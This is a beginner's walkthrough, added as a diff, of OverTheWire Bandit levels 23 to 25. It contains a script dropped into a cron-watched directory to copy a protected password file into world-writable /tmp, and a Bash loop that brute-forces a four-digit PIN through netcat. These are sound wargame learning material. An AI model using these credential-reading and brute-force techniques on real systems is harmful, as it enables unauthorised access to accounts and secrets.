@@ -1,0 +1,227 @@
+Day 06 – OverTheWire Bandit (Level 23–25)
+
+Level 23–24
+
+Task
+
+A program is running automatically at regular intervals using Cron, the time-based job scheduler.
+
+We need to inspect the configuration inside "/etc/cron.d/" to understand which command is being executed.
+
+This level requires creating our first shell script. The script must be placed in the appropriate directory so that the Cron job can execute it.
+
+Steps Performed
+
+1. Listed all files:
+   
+   ls -la
+
+2. Checked the Cron configuration directory:
+   
+   ls /etc/cron.d/
+
+3. Read the Cron job configuration:
+   
+   cat /etc/cron.d/cronjob_bandit24
+
+4. Inspected the script being executed by Cron:
+   
+   cat /usr/bin/cronjob_bandit24.sh
+
+5. Created a temporary working directory:
+   
+   mkdir /tmp/parth24
+
+6. Entered the directory:
+   
+   cd /tmp/parth24
+
+7. Created my first shell script using Nano:
+   
+   nano bandit24_pass.sh
+
+8. Wrote the following script:
+   
+   #!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/parth24/password
+
+9. Changed the permissions of the temporary directory:
+   
+   chmod 777 /tmp/parth24
+
+10. Made the shell script executable:
+    
+    chmod 755 bandit24_pass.sh
+
+11. Copied the script into the directory monitored by the Cron job:
+    
+    cp bandit24_pass.sh /var/spool/bandit24/foo
+
+12. Waited for the Cron job to execute the script:
+    
+    sleep 60
+
+13. Read the generated password file:
+    
+    cat password
+
+14. Retrieved the password for Bandit 24.
+
+Understanding the Shell Script
+
+The script contains two important parts:
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/parth24/password
+
+- "#!/bin/bash" – Specifies Bash as the interpreter for the script.
+- "cat" – Reads and displays the contents of a file.
+- "/etc/bandit_pass/bandit24" – The location of the current level's password.
+- ">" – Redirects the output into a file.
+- "/tmp/parth24/password" – The destination where the password is stored.
+
+Understanding File Permissions
+
+I also learned about different permission values:
+
+- "chmod 777" – Gives read, write, and execute permissions to everyone.
+- "chmod 755" – Gives the owner full permissions and others read and execute permissions.
+- "chmod" – Changes file or directory permissions.
+
+Problem Faced
+
+This level gave me quite a lot of trouble, especially with file and directory permissions. As a beginner, I found it difficult to understand which permissions were required for the script and its directory.
+
+I also made things unnecessarily complicated by creating a separate password file for convenience, which initially confused me further.
+
+I became impatient while troubleshooting and eventually used AI for help. However, that also confused me at first because I was still trying to understand how the Cron job, shell script, and permissions worked together.
+
+My advice for this level is to read other people's walkthroughs and understand how their scripts work instead of blindly copying commands.
+
+This was my first experience creating a shell script for a Linux challenge, which made this level an important learning experience.
+
+---
+
+Level 24–25
+
+Task
+
+A daemon is listening on port "30002" and will provide the password for Bandit 25 if we submit the password for Bandit 24 along with a secret four-digit numeric PIN.
+
+There is no way to retrieve the PIN directly, so we must try all 10,000 possible combinations using brute force.
+
+We do not need to create a new connection for every attempt.
+
+Steps Performed
+
+1. Listed all files:
+   
+   ls -la
+
+2. Created a temporary working directory:
+   
+   mkdir /tmp/parth25
+
+3. Entered the directory:
+   
+   cd /tmp/parth25
+
+4. Created a shell script:
+   
+   nano brute.sh
+
+5. Wrote the following Bash script:
+   
+   #!/bin/bash
+
+pass=$(cat /etc/bandit_pass/bandit24)
+
+for pin in $(seq -w 0000 9999); do
+    echo "$pass $pin"
+done | nc localhost 30002
+
+6. Made the script executable:
+   
+   chmod +x brute.sh
+
+7. Executed the script:
+   
+   ./brute.sh
+
+8. Waited for the script to test the PIN combinations and return the password for Bandit 25.
+
+Understanding the Shell Script
+
+This level introduced me to Bash loops, variables, command substitution, and automated brute-force techniques.
+
+1. Storing the current password in a variable
+
+pass=$(cat /etc/bandit_pass/bandit24)
+
+- "pass" – The name of the variable.
+- "$(...)" – Command substitution, which executes a command and stores its output.
+- "cat" – Reads the current level's password file.
+
+2. Generating all possible PIN combinations
+
+seq -w 0000 9999
+
+- "seq" – Generates a sequence of numbers.
+- "-w" – Pads numbers with leading zeros to maintain equal width.
+- "0000" – Starting PIN.
+- "9999" – Ending PIN.
+
+This generates all 10,000 possible four-digit PIN combinations.
+
+3. Using a for loop
+
+for pin in $(seq -w 0000 9999); do
+    echo "$pass $pin"
+done
+
+- "for" – Starts a loop.
+- "pin" – Variable that stores the current PIN.
+- "do" – Starts the commands inside the loop.
+- "echo" – Prints the password and current PIN together.
+- "done" – Ends the loop.
+
+The loop generates an input line containing the Bandit 24 password and one PIN at a time.
+
+4. Sending all combinations through Netcat
+
+done | nc localhost 30002
+
+- "|" – Pipeline operator that passes the output of the loop to another command.
+- "nc" – Netcat networking utility.
+- "localhost" – Connects to the local machine.
+- "30002" – Specifies the port where the daemon is listening.
+
+The important part is that all 10,000 combinations are sent through a single Netcat connection instead of creating a new connection for every PIN.
+
+The daemon checks each combination and returns the password when the correct PIN is found.
+
+Problem Faced
+
+The main challenge in this level was understanding how the brute-force script worked.
+
+Initially, I was not familiar with commands such as "seq", Bash variables, loops, and command substitution.
+
+After understanding the script, I learned how to automate repetitive tasks instead of manually entering thousands of PIN combinations.
+
+The most interesting part was discovering that all 10,000 combinations could be sent through one Netcat connection using a pipeline.
+
+This level helped me understand how shell scripting can automate tasks that would otherwise take a very long time to perform manually.
+
+---
+
+Overall Learning
+
+During Day 06, I learned how to create and execute shell scripts, understand Linux file permissions, work with Cron jobs, and automate repetitive tasks using Bash.
+
+I gained practical experience with commands and concepts such as "mkdir", "nano", "chmod", "cp", "sleep", "cat", "seq", variables, loops, command substitution, and pipelines.
+
+The most challenging part was Level 23–24 because it was my first experience creating a shell script and dealing with Linux permissions.
+
+Level 24–25 was interesting because it introduced brute-force automation and showed how scripting can make repetitive tasks much easier.
+
+Overall, these levels improved my understanding of Linux automation and basic Bash scripting.
